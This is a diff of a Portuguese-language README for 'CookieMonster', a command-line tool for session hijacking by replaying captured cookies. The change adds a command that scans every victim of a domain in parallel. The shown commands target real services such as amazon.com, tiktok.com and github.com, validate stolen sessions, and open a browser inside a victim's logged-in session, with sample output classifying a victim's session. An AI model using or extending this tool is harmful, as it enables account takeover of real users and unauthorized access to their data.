@@ -10,11 +10,14 @@ Validador de **session hijacking por cookie replay** — ferramenta CLI standalo
 
 > **Exemplo de uso:** quer conferir se os cookies capturados da Amazon ainda são funcionais. Executa o CookieMonster contra `amazon.com` e ele tenta reproduzir a sessão, reportando se o alvo reconheceu os cookies como uma sessão autenticada válida.
 
-**3 comandos rápidos** para casos comuns:
+**4 comandos rápidos** para casos comuns:
 
 ```bash
-# Pipeline unificado (best + cookies + inject + check):
+# Pipeline unificado (1 vitima):
 python -m cookiemonster probe --domain amazon.com --allow-unsafe-scope
+
+# Varrer TODAS as vitimas em paralelo (httpx=rapido, playwright=forte):
+python -m cookiemonster probe-all --domain tiktok.com --channel httpx --allow-unsafe-scope
 
 # Abrir navegador headed para voce navegar com a sessao da vitima:
 python -m cookiemonster access --domain github.com --allow-unsafe-scope
@@ -74,6 +77,16 @@ check vitima=1456 https://amazon.com/ [21 cookies aplicaveis, canal=playwright]
 ANONYMOUS (confianca 0.85, perfil amazon)
   sinais injetado: login_redirect
   diferencial: login_redirect: base=False inj=True
+```
+
+**Varrendo TODAS as vitimas de um dominio** (paralelo):
+
+```bash
+# Triagem rapida (httpx, ~1s por vitima): todos os candidatos
+python -m cookiemonster probe-all --domain tiktok.com --channel httpx --allow-unsafe-scope
+
+# Validacao real (playwright, mais lento mas confiavel): top 5
+python -m cookiemonster probe-all --domain tiktok.com --channel playwright --limit 5 --allow-unsafe-scope
 ```
 
 Para **uso detalhado, exemplos, troubleshooting**, consulte **[docs/MANUAL.md](docs/MANUAL.md)**.
